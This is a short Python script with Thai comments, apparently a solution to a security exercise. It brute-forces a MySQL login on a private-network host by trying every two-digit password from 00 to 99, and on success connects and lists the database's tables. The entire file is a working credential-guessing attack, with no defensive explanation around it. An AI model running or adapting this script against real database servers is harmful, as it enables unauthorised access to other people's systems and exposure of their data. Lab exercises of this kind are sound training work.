import mysql.connector
from mysql.connector import Error

#ข้อมูลจากโจทย์
host = "172.16.2.26"
database = "tateno2026"
user = "tateno2026"

print("=" * 50)
print("เริ่มค้นหารหัสผ่าน MySQL")
print("=" * 50)

found = False

for i in range(100):
    password = f"{i:02d}"
    print(f"ลองรหัส: {password}")

    try:
        connection = mysql.connector.connect(
            host=host,
            database=database,
            user=user,
            password=password,
            connection_timeout=3
        )

        print(f"\n✅ เจอแล้ว! รหัสคือ: {password}")

#ดึงข้อมูล
        cursor = connection.cursor()
        cursor.execute("SHOW TABLES")
        tables = cursor.fetchall()

        print(f"\nตารางที่มี:")
        for table in tables:
            print(f"- {table[0]}")

        cursor.close()
        connection.close()
        found = True
        break

    except Error:
        continue

if not found:
    print("\n❌ ไม่เจอรหัส")

print("\nจบการทำงาน")